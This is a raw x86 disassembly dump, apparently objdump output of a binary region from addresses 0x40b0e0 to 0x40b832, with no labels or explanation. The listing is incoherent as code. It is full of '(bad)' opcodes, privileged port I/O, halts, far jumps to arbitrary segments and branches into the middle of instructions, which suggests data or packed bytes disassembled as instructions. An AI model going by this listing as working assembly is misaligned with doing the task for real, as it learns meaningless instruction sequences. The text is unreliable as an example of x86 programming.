  40b0e0:	sbb    eax,DWORD PTR [ecx-0x4db2637e]
  40b0e6:	push   ebp
  40b0e7:	retf   
  40b0e8:	imul   ebp,DWORD PTR [esi-0x7558883f],0xa
  40b0ef:	mov    ecx,DWORD PTR [ecx]
  40b0f1:	outs   dx,BYTE PTR ds:[esi]
  40b0f2:	mov    gs:0xa19d16e0,eax
  40b0f8:	cmp    DWORD PTR [ebx-0x1f],ecx
  40b0fb:	push   ecx
  40b0fc:	pop    ecx
  40b0fd:	in     eax,0x2c
  40b0ff:	add    esp,DWORD PTR cs:[eax-0x51]
  40b103:	(bad)  
  40b104:	xchg   BYTE PTR es:[ecx+0x22ecbb28],bh
  40b10b:	daa    
  40b10c:	add    ebp,DWORD PTR ds:0xdbb9926a
  40b112:	sbb    eax,0x382eb1e
  40b117:	(bad)  
  40b118:	and    bl,BYTE PTR [esi-0x29ebd786]
  40b11e:	popa   
  40b11f:	sub    ebp,ebx
  40b121:	ss es in al,0xf0
  40b125:	inc    esp
  40b126:	test   eax,0x12b9ded9
  40b12b:	sbb    ecx,edi
  40b12d:	and    dl,BYTE PTR [esi+0x523e91df]
  40b133:	adc    DWORD PTR [ebp+0xcad0ed4],esp
  40b139:	clc    
  40b13a:	ja     0x40b161
  40b13c:	(bad)  
  40b13d:	daa    
  40b13e:	cwde   
  40b13f:	add    dh,cl
  40b141:	mov    eax,ds:0xf40f4964
  40b146:	call   0xdad31072
  40b14b:	fild   QWORD PTR [edx-0x7c]
  40b14e:	xchg   esi,eax
  40b14f:	std    
  40b150:	aam    0xb9
  40b152:	pop    ebx
  40b153:	ret    0xfabe
  40b156:	mov    esp,0x1012328f
  40b15b:	or     edi,DWORD PTR [edi+edx*8-0x4d]
  40b15f:	xchg   ebp,eax
  40b160:	mov    esp,0x160a13d6
  40b165:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b166:	adc    bh,BYTE PTR [ebp-0x7f22b23c]
  40b16c:	mov    eax,ds:0xf531d59f
  40b171:	add    ebx,DWORD PTR [edi-0x51]
  40b174:	add    eax,0xa55fea85
  40b179:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b17a:	jo     0x40b134
  40b17c:	mov    ecx,0xf7493f8c
  40b181:	in     eax,0x89
  40b183:	hlt    
  40b184:	mul    eax
  40b186:	cmp    eax,0x64a62990
  40b18b:	pop    ds
  40b18c:	pop    edx
  40b18d:	aam    0xde
  40b18f:	sti    
  40b190:	xchg   BYTE PTR [ebp-0x693532c0],ah
  40b196:	mov    bh,0xd4
  40b198:	mov    dl,0xc0
  40b19a:	cmp    eax,0x2f268b3f
  40b19f:	jno    0x40b166
  40b1a1:	sahf   
  40b1a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1a3:	outs   dx,DWORD PTR ds:[esi]
  40b1a4:	addr16 mov bh,0x18
  40b1a7:	sub    BYTE PTR ds:0xc4d8b8fa,dl
  40b1ad:	ds sbb eax,0x85b05c30
  40b1b3:	cld    
  40b1b4:	sub    esi,DWORD PTR [edx+0xb68e6e7]
  40b1ba:	xor    BYTE PTR [edi],al
  40b1bc:	repnz pushw 0xb3d
  40b1c1:	jle    0x40b1d8
  40b1c3:	sti    
  40b1c4:	out    dx,al
  40b1c5:	adc    al,0x3
  40b1c7:	jp     0x40b1bb
  40b1c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1ca:	std    
  40b1cb:	mov    edi,0x1f11b208
  40b1d0:	xor    DWORD PTR [ebp-0x44],esp
  40b1d3:	pop    esi
  40b1d4:	loopne 0x40b1b5
  40b1d6:	clc    
  40b1d7:	dec    eax
  40b1d8:	push   0xffffffdd
  40b1da:	lods   al,BYTE PTR ds:[esi]
  40b1db:	ret    
  40b1dc:	and    bh,BYTE PTR [eax+ebx*8-0x37]
  40b1e0:	push   ecx
  40b1e1:	sbb    eax,0x6ae2d15a
  40b1e6:	pop    ebp
  40b1e7:	add    DWORD PTR [edx],ebp
  40b1e9:	xchg   ebx,eax
  40b1ea:	out    0x9c,al
  40b1ec:	inc    eax
  40b1ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1ee:	or     BYTE PTR [edi-0x21],cl
  40b1f1:	rcl    BYTE PTR ds:0xcd410434,1
  40b1f7:	mov    eax,0xa3fc2a92
  40b1fc:	xchg   edi,eax
  40b1fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1fe:	and    al,0xdd
  40b200:	arpl   di,cx
  40b202:	xor    esp,edx
  40b204:	pop    esi
  40b205:	pop    esi
  40b206:	adc    edx,esi
  40b208:	xor    dl,cl
  40b20a:	aas    
  40b20b:	fisttp QWORD PTR [edx+0xf]
  40b20e:	nop
  40b20f:	sahf   
  40b210:	and    bl,dl
  40b212:	mov    al,ds:0x84f75af7
  40b217:	push   ebx
  40b218:	inc    ebx
  40b219:	add    BYTE PTR [ebx+ecx*4],ah
  40b21c:	nop
  40b21d:	aam    0xb6
  40b21f:	sbb    DWORD PTR gs:[edi+0x2ee9fae1],ebp
  40b226:	sbb    dh,0x0
  40b229:	out    dx,al
  40b22a:	daa    
  40b22b:	leave  
  40b22c:	sahf   
  40b22d:	mov    edx,0x6150f5e1
  40b232:	es dec ecx
  40b234:	xchg   esi,eax
  40b235:	cld    
  40b236:	call   0xcf36:0x87213cdb
  40b23d:	ret    0xc253
  40b240:	xor    al,0xae
  40b242:	mov    dh,0xf9
  40b244:	fist   WORD PTR [ebx-0x53]
  40b247:	dec    ecx
  40b248:	or     eax,DWORD PTR [ecx+0x4e]
  40b24b:	shl    DWORD PTR [ecx+0x5774a5e5],0xe
  40b252:	jno    0x40b1e8
  40b254:	not    BYTE PTR [eax]
  40b256:	cs inc ebx
  40b258:	mov    ds:0x8aa7257,eax
  40b25d:	and    al,0xa9
  40b25f:	dec    eax
  40b260:	je     0x40b285
  40b262:	push   ss
  40b263:	cwde   
  40b264:	mov    ah,0x7a
  40b266:	mov    ds:0x9fb3b4bb,al
  40b26c:	shr    BYTE PTR cs:[edi-0x3a],1
  40b270:	fistp  QWORD PTR [edi-0x4aff0e3c]
  40b276:	out    dx,eax
  40b277:	push   edi
  40b278:	fst    QWORD PTR [esi]
  40b27a:	or     eax,0x20149fd2
  40b27f:	cmp    DWORD PTR [edi+0x4c],esp
  40b282:	clc    
  40b283:	add    DWORD PTR [ebx-0x18d9fd4c],ebx
  40b289:	je     0x40b293
  40b28b:	add    dl,cl
  40b28d:	mov    bh,BYTE PTR [eax]
  40b28f:	adc    ch,BYTE PTR [ecx]
  40b291:	xchg   DWORD PTR [edx],ecx
  40b293:	pop    ecx
  40b294:	ret    0xc16e
  40b297:	mov    bl,0x3f
  40b299:	cdq    
  40b29a:	dec    ebp
  40b29b:	cdq    
  40b29c:	jecxz  0x40b28b
  40b29e:	arpl   di,ax
  40b2a0:	mov    ebp,0x1ac8ba67
  40b2a5:	shr    edi,1
  40b2a7:	push   ds
  40b2a8:	stos   BYTE PTR es:[edi],al
  40b2a9:	or     DWORD PTR [ecx+0x4d],0x8674e98
  40b2b0:	lods   al,BYTE PTR ds:[esi]
  40b2b1:	lods   eax,DWORD PTR ds:[esi]
  40b2b2:	push   ss
  40b2b3:	jecxz  0x40b32b
  40b2b5:	or     ebx,edi
  40b2b7:	div    BYTE PTR [ecx]
  40b2b9:	sbb    BYTE PTR [esi+eiz*8],dl
  40b2bc:	mov    ebx,0x1311abac
  40b2c1:	ja     0x40b2fe
  40b2c3:	or     al,0x7f
  40b2c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2c6:	sbb    edi,DWORD PTR [edi-0x68]
  40b2c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2ca:	cmp    al,BYTE PTR ds:0x5a637243
  40b2d0:	jo     0x40b303
  40b2d2:	hlt    
  40b2d3:	test   al,0x3b
  40b2d5:	(bad)  
  40b2d6:	sub    BYTE PTR [edi],0xb1
  40b2d9:	les    edi,FWORD PTR [ebp-0x700ac411]
  40b2df:	ret    
  40b2e0:	fwait
  40b2e1:	ret    
  40b2e2:	fwait
  40b2e3:	(bad)  
  40b2e4:	fcom   QWORD PTR [edi+0x1e4fc23]
  40b2ea:	xor    DWORD PTR [esi-0x5],0xfe89c4fc
  40b2f1:	fs mov edi,0x693760f3
  40b2f7:	mov    dh,BYTE PTR [ecx+0x51]
  40b2fa:	adc    bh,cl
  40b2fc:	mov    dl,0xff
  40b2fe:	iret   
  40b2ff:	jmp    0x28ac9875
  40b304:	dec    esp
  40b305:	dec    ebp
  40b306:	fisttp DWORD PTR ds:[ecx]
  40b309:	cwde   
  40b30a:	jmp    0x40b332
  40b30c:	sub    al,0xd3
  40b30e:	sub    al,0xdf
  40b310:	mov    ebx,0x9c37829c
  40b315:	pop    ebp
  40b316:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b317:	sbb    dl,0x1a
  40b31a:	cdq    
  40b31b:	out    0x7c,al
  40b31d:	cs in  al,dx
  40b31f:	inc    ebp
  40b320:	cli    
  40b321:	sahf   
  40b322:	gs out dx,al
  40b324:	test   al,0x3b
  40b326:	arpl   dx,dx
  40b328:	mov    ebp,0x8d37b04a
  40b32d:	inc    edx
  40b32e:	mov    al,ds:0xb1491538
  40b333:	test   DWORD PTR [ebp+0x58262e83],esi
  40b339:	mov    ds:0x7d66926b,al
  40b33e:	xchg   esp,eax
  40b33f:	push   edi
  40b340:	push   esi
  40b341:	mov    BYTE PTR [esi-0x8],dh
  40b344:	dec    ecx
  40b345:	xchg   edi,eax
  40b346:	test   eax,0x8bf11fbc
  40b34b:	mov    BYTE PTR [esi+eiz*8+0x758c4f71],ah
  40b352:	add    eax,0xc11aa786
  40b357:	div    BYTE PTR fs:[ecx+0x7d]
  40b35b:	mov    edi,0x4070a0a1
  40b360:	sbb    DWORD PTR [ecx],ebp
  40b362:	das    
  40b363:	jmp    0x40b3b1
  40b365:	int    0xd8
  40b367:	cmc    
  40b368:	pop    ss
  40b369:	lds    ebp,FWORD PTR cs:[esi-0x45]
  40b36d:	mov    WORD PTR [ebp+0x79],?
  40b370:	jmp    0x40b314
  40b372:	mov    al,0xed
  40b374:	mov    ah,0x60
  40b376:	dec    esi
  40b377:	cld    
  40b378:	dec    eax
  40b379:	(bad)  
  40b37a:	mov    ds:0xbbcffcfb,eax
  40b380:	pop    es
  40b381:	jge    0x40b33e
  40b383:	enter  0x63a1,0x29
  40b387:	lods   al,BYTE PTR ds:[esi]
  40b388:	push   esi
  40b389:	jo     0x40b3e0
  40b38b:	inc    ebx
  40b38c:	jmp    0x34d5:0xf1fb3110
  40b393:	xchg   esi,eax
  40b394:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40b396:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b397:	push   edx
  40b398:	repnz in eax,0xf
  40b39b:	cmp    DWORD PTR [esi+0x6b],ecx
  40b39e:	adc    edi,DWORD PTR [ebx-0x4e]
  40b3a1:	xchg   ecx,eax
  40b3a2:	mov    ss,WORD PTR [esi+0x4]
  40b3a5:	out    0x94,al
  40b3a7:	nop
  40b3a8:	jecxz  0x40b3e4
  40b3aa:	pop    ebp
  40b3ab:	int3   
  40b3ac:	popf   
  40b3ad:	(bad)  
  40b3ae:	fild   DWORD PTR [ebx-0x4d]
  40b3b1:	cli    
  40b3b2:	sub    dl,BYTE PTR ds:0xf8fcba9a
  40b3b8:	pop    es
  40b3b9:	bound  esi,QWORD PTR [eax+ebx*8]
  40b3bc:	or     al,BYTE PTR [ebx]
  40b3be:	mov    esp,0x4003a5f6
  40b3c3:	jge    0x40b34c
  40b3c5:	mov    cl,0x88
  40b3c7:	lahf   
  40b3c8:	mov    dh,0xd8
  40b3ca:	mov    esp,0xb0e7a7e3
  40b3cf:	adc    ch,cl
  40b3d1:	cmp    al,0xc6
  40b3d3:	in     al,0x41
  40b3d5:	jo     0x40b359
  40b3d7:	(bad)  
  40b3d9:	jmp    0xc619d944
  40b3de:	mov    edi,DWORD PTR [edi+eiz*2-0x35eaf37c]
  40b3e5:	and    BYTE PTR [ebx-0x76afa08f],0x20
  40b3ec:	(bad)  
  40b3ed:	adc    BYTE PTR [edx],bh
  40b3ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3f0:	xlat   BYTE PTR ds:[ebx]
  40b3f1:	js     0x40b376
  40b3f3:	push   esp
  40b3f4:	pop    ebx
  40b3f5:	adc    DWORD PTR [ebp+0x1577264d],ebx
  40b3fb:	pop    esp
  40b3fc:	fsub   st(4),st
  40b3fe:	clc    
  40b3ff:	cmp    bh,BYTE PTR [eax-0x1b420a62]
  40b405:	inc    edx
  40b406:	sub    BYTE PTR [edx-0x47],ah
  40b409:	(bad)  
  40b40a:	enter  0xd750,0xd5
  40b40e:	and    DWORD PTR [ebx+eiz*2+0x75],ebx
  40b412:	fs hlt 
  40b414:	mov    dh,0x83
  40b416:	outs   dx,BYTE PTR ds:[esi]
  40b417:	jbe    0x40b3c4
  40b419:	imul   esi,DWORD PTR [esi],0xffffffa8
  40b41c:	mov    edx,0xb03d8293
  40b421:	or     esp,ebp
  40b423:	inc    edx
  40b424:	sbb    DWORD PTR [ebx],0xb7902cc6
  40b42a:	pop    esi
  40b42b:	push   ebp
  40b42c:	stc    
  40b42d:	xchg   edi,eax
  40b42e:	xchg   ecx,eax
  40b42f:	fisttp DWORD PTR [ebp+0x44]
  40b432:	pop    ss
  40b433:	ds dec ebp
  40b435:	fs out 0x29,eax
  40b438:	cs sbb bl,bl
  40b43b:	add    BYTE PTR [eax+0x3a],0x30
  40b43f:	cmp    eax,0x4428a538
  40b444:	dec    edi
  40b445:	cli    
  40b446:	jne    0x40b3ce
  40b448:	add    ch,ah
  40b44a:	je     0x40b4c1
  40b44c:	xor    eax,0xdd3fb6f1
  40b451:	pop    ecx
  40b452:	jmp    0x34dc:0xc709f8ef
  40b459:	stos   DWORD PTR es:[edi],eax
  40b45a:	popf   
  40b45b:	jns    0x40b4ca
  40b45d:	jg     0x40b3e4
  40b45f:	es pusha 
  40b461:	idiv   BYTE PTR [edx-0x3d105f18]
  40b467:	xor    ch,BYTE PTR [ecx+0x22c2b821]
  40b46d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b46e:	ret    0x9c8c
  40b471:	fild   QWORD PTR [ebp+eax*2+0x6eeeb1]
  40b478:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b479:	mov    dh,bh
  40b47b:	loope  0x40b464
  40b47d:	cmp    bl,ah
  40b47f:	and    BYTE PTR [esi],dh
  40b481:	jp     0x40b4c9
  40b483:	xchg   ebp,eax
  40b484:	add    edx,DWORD PTR [ebx-0x15]
  40b487:	retf   0x98fd
  40b48a:	call   0x182f:0x1fcd6845
  40b491:	lea    ebp,[esi+0x3c]
  40b494:	jmp    0x50ed:0xdd9814c
  40b49b:	push   eax
  40b49c:	(bad)  
  40b49d:	mov    cl,0x27
  40b49f:	(bad)  
  40b4a0:	shl    esi,0x9c
  40b4a3:	lahf   
  40b4a4:	sbb    esp,DWORD PTR [esi-0x69]
  40b4a7:	sub    ecx,DWORD PTR [edi+0x25]
  40b4aa:	jle    0x40b4ad
  40b4ac:	rcl    DWORD PTR [esi+0x63d33bcc],1
  40b4b2:	test   BYTE PTR [ebx+0x3941ad1f],bl
  40b4b8:	push   ebp
  40b4b9:	cwde   
  40b4ba:	mov    cl,BYTE PTR [edx]
  40b4bc:	int3   
  40b4bd:	xor    al,0xe2
  40b4bf:	pop    edi
  40b4c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4c1:	in     al,dx
  40b4c2:	jge    0x40b518
  40b4c4:	leave  
  40b4c5:	or     DWORD PTR [edx-0x7bb54a54],0xffffffcf
  40b4cc:	shl    BYTE PTR [eax],1
  40b4ce:	mov    ebp,0x9cba60ca
  40b4d3:	in     eax,dx
  40b4d4:	push   edi
  40b4d5:	xor    edx,ebx
  40b4d7:	rcr    BYTE PTR [bx+di-0x53cb],0x38
  40b4dd:	xchg   ebp,eax
  40b4de:	pop    esp
  40b4df:	jecxz  0x40b534
  40b4e1:	out    0x49,al
  40b4e3:	imul   esi,DWORD PTR [esi+0x2b84a662],0x138bede2
  40b4ed:	dec    esp
  40b4ee:	fsubr  st(6),st
  40b4f0:	mov    dl,0xc7
  40b4f2:	ficomp DWORD PTR [ebx]
  40b4f4:	inc    ecx
  40b4f5:	cmp    cl,ah
  40b4f7:	pop    eax
  40b4f8:	call   DWORD PTR [eax+0x497ecbe8]
  40b4fe:	xchg   ecx,eax
  40b4ff:	loope  0x40b56c
  40b501:	and    dl,bl
  40b503:	in     al,dx
  40b504:	inc    edi
  40b505:	pop    ds
  40b506:	mov    ebx,DWORD PTR [eax+esi*1+0x124cb3a1]
  40b50d:	cld    
  40b50e:	or     esi,DWORD PTR ds:0x3786a163
  40b514:	mov    eax,?
  40b516:	push   ds
  40b517:	xor    bh,ah
  40b519:	je     0x40b554
  40b51b:	sbb    al,0xee
  40b51d:	inc    eax
  40b51e:	mov    ebp,0x2eb0e874
  40b523:	jecxz  0x40b55f
  40b525:	cmp    al,BYTE PTR [eax-0x2a]
  40b528:	inc    eax
  40b529:	mov    cl,0xe1
  40b52b:	into   
  40b52c:	and    DWORD PTR [edx],0xffffffad
  40b52f:	imul   esp,ebp,0x415a1e1
  40b535:	push   ebp
  40b536:	test   BYTE PTR [eax-0x10094339],cl
  40b53c:	pop    ecx
  40b53d:	push   ecx
  40b53e:	xchg   edx,eax
  40b53f:	das    
  40b540:	xchg   edx,eax
  40b541:	mov    edx,0xd4ead56a
  40b546:	mov    dl,BYTE PTR [edi]
  40b548:	cs push ecx
  40b54a:	mov    ah,BYTE PTR [edx-0x3c]
  40b54d:	and    edi,DWORD PTR [ebx+0x6d]
  40b550:	and    al,0xe4
  40b552:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b553:	and    BYTE PTR [esi+0x5e],dh
  40b556:	scas   al,BYTE PTR es:[edi]
  40b557:	popa   
  40b558:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b559:	ds adc cl,bl
  40b55c:	or     ecx,edx
  40b55e:	sub    DWORD PTR [edi],esp
  40b560:	inc    edi
  40b561:	add    BYTE PTR [ecx+0x33],cl
  40b564:	(bad)  
  40b565:	xor    al,0xa
  40b567:	add    dh,0x4d
  40b56a:	push   0x4c
  40b56c:	adc    DWORD PTR [edi-0x2d7eddad],ebp
  40b572:	dec    ebp
  40b573:	cmp    dh,BYTE PTR [esi]
  40b575:	(bad)  
  40b576:	jbe    0x40b598
  40b578:	mov    ebp,0xdeb01a5e
  40b57d:	fnstcw WORD PTR [eax+eiz*2-0x6f9f8778]
  40b584:	and    al,0x6d
  40b586:	call   0xb1222c4b
  40b58b:	leave  
  40b58c:	test   eax,0xba9bfd03
  40b591:	xor    dl,BYTE PTR [edx-0x4a]
  40b594:	push   ebp
  40b595:	dec    ax
  40b597:	clc    
  40b598:	sub    bl,BYTE PTR [esi+0x6fccd2eb]
  40b59e:	cmp    DWORD PTR [edi-0x8],eax
  40b5a1:	jmp    0x8f976d87
  40b5a6:	push   es
  40b5a7:	xor    BYTE PTR [eax+ebp*2+0x315e9733],bl
  40b5ae:	push   cs
  40b5af:	ret    0x8d84
  40b5b2:	arpl   WORD PTR [ebp-0x5fe0c7f0],dx
  40b5b8:	fcomp  QWORD PTR [ebp+0x1fa77c99]
  40b5be:	or     al,0xba
  40b5c0:	mov    ds:0xeeaaf1fe,al
  40b5c5:	iret   
  40b5c6:	adc    eax,0xc99af7d0
  40b5cb:	lds    ecx,FWORD PTR [edx+0x55]
  40b5ce:	rol    DWORD PTR [eax-0x7a],1
  40b5d1:	out    0x78,eax
  40b5d3:	dec    ecx
  40b5d4:	push   es
  40b5d5:	loopne 0x40b637
  40b5d7:	xor    eax,0xfcf464b7
  40b5dc:	or     eax,DWORD PTR [edi]
  40b5de:	mov    edi,DWORD PTR [ebp+esi*8-0x2c]
  40b5e2:	cs xchg edi,eax
  40b5e4:	sbb    BYTE PTR cs:[ebx+0x43],0xc8
  40b5e9:	stos   BYTE PTR es:[edi],al
  40b5ea:	inc    ecx
  40b5eb:	lahf   
  40b5ec:	add    DWORD PTR [edi+0x7f4f269d],edi
  40b5f2:	push   edx
  40b5f3:	sbb    BYTE PTR [esi+ebx*4+0x109d4b13],bl
  40b5fa:	scas   al,BYTE PTR es:[edi]
  40b5fb:	lahf   
  40b5fc:	shl    DWORD PTR [ebx],cl
  40b5fe:	sub    eax,0xc88b029f
  40b603:	ds popa 
  40b605:	les    ebp,FWORD PTR [edi+0x7941885d]
  40b60b:	jmp    0x40b5d8
  40b60d:	mov    ebp,0xd611ff1a
  40b612:	dec    ebp
  40b613:	jne    0x40b60a
  40b615:	sub    eax,0x7204eb9b
  40b61a:	lods   eax,DWORD PTR ds:[esi]
  40b61b:	or     BYTE PTR [ebp+0x55],ah
  40b61e:	xor    ebx,DWORD PTR [ebx+0x64]
  40b621:	pop    ds
  40b622:	push   cs
  40b623:	sbb    dh,dh
  40b625:	push   edi
  40b626:	sub    ah,BYTE PTR [esi-0x5d7a0191]
  40b62c:	sbb    ebx,DWORD PTR [esi+0x3c8c1fa]
  40b632:	or     bl,BYTE PTR [ebp+0x29020b18]
  40b638:	fistp  QWORD PTR [edi]
  40b63a:	jge    0x40b60a
  40b63c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b63d:	scas   al,BYTE PTR es:[edi]
  40b63e:	ins    DWORD PTR es:[edi],dx
  40b63f:	mov    dh,0x64
  40b641:	xchg   ebp,ebp
  40b643:	mov    ds:0x4179b4a5,eax
  40b648:	sbb    ecx,DWORD PTR [ecx-0x5b3ec2c6]
  40b64e:	fist   DWORD PTR [edi]
  40b650:	and    DWORD PTR ds:0xaac109c5,eax
  40b656:	out    0xc0,al
  40b658:	test   eax,0x836deae3
  40b65d:	repnz cmp ebp,DWORD PTR [edi+0x76e503f9]
  40b664:	and    ah,BYTE PTR [edx-0x16]
  40b667:	repz push ebx
  40b669:	mov    ah,0x7a
  40b66b:	sub    al,BYTE PTR [ecx]
  40b66d:	retf   
  40b66e:	loop   0x40b678
  40b670:	mov    eax,0x7cf6b565
  40b675:	rcr    DWORD PTR [ebx-0x6c],0x44
  40b679:	lods   al,BYTE PTR ds:[esi]
  40b67a:	push   edi
  40b67b:	icebp  
  40b67c:	push   ss
  40b67d:	and    eax,0xa5127924
  40b682:	popa   
  40b683:	dec    ebx
  40b684:	bound  esi,QWORD PTR [ebp+0x3e4e39d7]
  40b68a:	in     eax,dx
  40b68b:	xor    edi,DWORD PTR [edx-0x706ee100]
  40b691:	cli    
  40b692:	push   0xffffffaa
  40b694:	sahf   
  40b695:	popa   
  40b696:	popa   
  40b697:	call   FWORD PTR cs:[ecx]
  40b69a:	adc    al,0x15
  40b69c:	rol    BYTE PTR [esi+0x35],1
  40b69f:	dec    eax
  40b6a0:	dec    ebp
  40b6a1:	pop    edi
  40b6a2:	mov    ah,0x1e
  40b6a4:	adc    eax,0x357b6046
  40b6a9:	cld    
  40b6aa:	pop    esp
  40b6ab:	(bad)  
  40b6ac:	ins    DWORD PTR es:[edi],dx
  40b6ad:	test   BYTE PTR [ebp-0x1f],ch
  40b6b0:	xor    BYTE PTR [edx+0x59],dh
  40b6b3:	fst    QWORD PTR [eax+0x766cd334]
  40b6b9:	shl    BYTE PTR [eax+0x6f],cl
  40b6bc:	jns    0x40b687
  40b6be:	loope  0x40b6db
  40b6c0:	shr    BYTE PTR [ecx],1
  40b6c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6c3:	sbb    bh,BYTE PTR [eax+0x460cad84]
  40b6c9:	inc    edx
  40b6ca:	pop    edx
  40b6cb:	mov    ds:0x4ac08dd0,al
  40b6d0:	jns    0x40b706
  40b6d2:	xchg   ecx,eax
  40b6d3:	jecxz  0x40b693
  40b6d5:	sbb    BYTE PTR [ecx-0x25386e14],0x29
  40b6dc:	cdq    
  40b6dd:	aas    
  40b6de:	out    0x0,al
  40b6e0:	xchg   edx,eax
  40b6e1:	cdq    
  40b6e2:	or     edi,edi
  40b6e4:	sbb    eax,0xfc55f90c
  40b6e9:	xchg   esi,eax
  40b6ea:	out    0xa6,eax
  40b6ec:	addr16 popa 
  40b6ee:	pop    edi
  40b6ef:	xchg   DWORD PTR [ecx+0x296a25cb],esp
  40b6f5:	shl    al,cl
  40b6f7:	cmp    al,BYTE PTR [edx]
  40b6f9:	fpatan 
  40b6fb:	jb     0x40b776
  40b6fd:	push   ecx
  40b6fe:	stos   DWORD PTR es:[edi],eax
  40b6ff:	inc    edi
  40b700:	loop   0x40b6ab
  40b702:	jl     0x40b6e6
  40b704:	adc    bh,dh
  40b706:	jne    0x40b6e4
  40b708:	in     eax,dx
  40b709:	in     eax,0xc9
  40b70b:	cmp    BYTE PTR [ebp-0x3493e932],ch
  40b711:	xchg   BYTE PTR [eax],dh
  40b713:	aam    0xbc
  40b715:	bound  ebp,QWORD PTR [ecx-0x72]
  40b718:	mov    bh,0x0
  40b71a:	mov    bh,0x6a
  40b71c:	adc    BYTE PTR [edi-0x1170a2f9],ah
  40b722:	xchg   ebp,eax
  40b723:	inc    esi
  40b724:	out    0xb7,eax
  40b726:	push   0x3fd2f998
  40b72b:	fistp  WORD PTR [ebx]
  40b72d:	or     DWORD PTR [ecx+ebx*2],0xffffff8e
  40b731:	(bad)  
  40b732:	cdq    
  40b733:	pop    ss
  40b734:	aaa    
  40b735:	dec    edx
  40b736:	sub    DWORD PTR [eax-0x1],ecx
  40b739:	sbb    BYTE PTR [ebx+ebp*8],cl
  40b73c:	sbb    al,dh
  40b73e:	leave  
  40b73f:	dec    ebp
  40b740:	push   ecx
  40b741:	inc    eax
  40b742:	test   eax,0x860dbe16
  40b747:	and    DWORD PTR ss:[ecx],eax
  40b74a:	outs   dx,BYTE PTR ds:[esi]
  40b74b:	cmp    DWORD PTR [edi],ebp
  40b74d:	and    eax,0xa61919af
  40b752:	adc    al,0xde
  40b754:	xchg   bx,ax
  40b756:	xchg   ecx,eax
  40b757:	ja     0x40b6dc
  40b759:	popa   
  40b75a:	adc    ebx,ebx
  40b75c:	xchg   esp,eax
  40b75d:	push   esi
  40b75e:	push   es
  40b75f:	adc    dh,BYTE PTR ds:0xdd6cf948
  40b765:	xor    BYTE PTR [esi+0x20],0x33
  40b769:	inc    edi
  40b76a:	sub    al,0xef
  40b76c:	jnp    0x40b793
  40b76e:	cmp    eax,0xc73781e3
  40b773:	mov    esi,0x7dc2e4de
  40b778:	retf   
  40b779:	jne    0x40b7a9
  40b77b:	sub    edx,0x55ac6427
  40b781:	inc    edi
  40b782:	popa   
  40b783:	in     al,dx
  40b784:	scas   al,BYTE PTR es:[edi]
  40b785:	stc    
  40b786:	xchg   edi,eax
  40b787:	test   BYTE PTR [edi],dl
  40b789:	les    ebp,FWORD PTR [edx-0x39d0344a]
  40b78f:	fs dec esp
  40b791:	inc    eax
  40b792:	scas   al,BYTE PTR es:[edi]
  40b793:	fmul   DWORD PTR [ebp-0x6]
  40b796:	sbb    DWORD PTR [esi+0x7c],eax
  40b799:	gs push 0x47
  40b79c:	stc    
  40b79d:	add    al,0x5
  40b79f:	scas   al,BYTE PTR es:[edi]
  40b7a0:	jmp    0x40b7a4
  40b7a2:	imul   ebp,DWORD PTR [esi],0x66
  40b7a5:	aad    0x96
  40b7a7:	sub    al,BYTE PTR [ecx-0x6e]
  40b7aa:	pop    ebx
  40b7ab:	push   0x447dc809
  40b7b0:	jle    0x40b777
  40b7b2:	push   0xf5854068
  40b7b7:	pop    ebx
  40b7b8:	daa    
  40b7b9:	cwde   
  40b7ba:	sub    edx,0xffffffa6
  40b7bd:	mov    ebp,?
  40b7bf:	in     eax,0x5d
  40b7c1:	sbb    ah,dl
  40b7c3:	mov    dh,0xaf
  40b7c5:	das    
  40b7c6:	xchg   ebx,eax
  40b7c7:	rol    BYTE PTR [ebx+0x5e],cl
  40b7ca:	inc    ebx
  40b7cb:	fstp   DWORD PTR [ebp+0x64032f6b]
  40b7d1:	ins    DWORD PTR es:[edi],dx
  40b7d2:	dec    esi
  40b7d3:	in     al,dx
  40b7d4:	sbb    edx,esi
  40b7d6:	pop    ds
  40b7d7:	adc    esi,0x337dfba8
  40b7dd:	retf   0xaf85
  40b7e0:	xor    DWORD PTR [ebx-0x7],ebp
  40b7e3:	jl     0x40b78a
  40b7e5:	push   es
  40b7e6:	lock pop ebp
  40b7e8:	dec    ebx
  40b7e9:	mov    al,ds:0x31b95d86
  40b7ee:	inc    edx
  40b7ef:	or     DWORD PTR [ecx+ebp*1-0x743a56e4],ebx
  40b7f6:	push   esi
  40b7f7:	repz mov dh,0x31
  40b7fa:	cmp    eax,0xd2973086
  40b7ff:	xchg   esi,eax
  40b800:	cmp    dl,BYTE PTR [eax-0x5f]
  40b803:	fwait
  40b804:	scas   al,BYTE PTR es:[edi]
  40b805:	xor    al,0x9
  40b807:	iret   
  40b808:	dec    ebp
  40b809:	mov    bh,0xeb
  40b80b:	mov    ch,0xdd
  40b80d:	xor    esi,DWORD PTR [esp+esi*4-0x46d9f5a4]
  40b814:	mov    dl,0x9d
  40b816:	push   eax
  40b817:	icebp  
  40b818:	nop
  40b819:	cld    
  40b81a:	sbb    al,0xf3
  40b81d:	xchg   DWORD PTR [ebx+0x67],ecx
  40b820:	retf   0x188f
  40b823:	add    eax,0x18bf04b7
  40b828:	stos   DWORD PTR es:[edi],eax
  40b829:	jl     0x40b7c5
  40b82b:	test   eax,0x4f428cc4
  40b830:	fmul   st,st(4)
  40b832:	pop    es
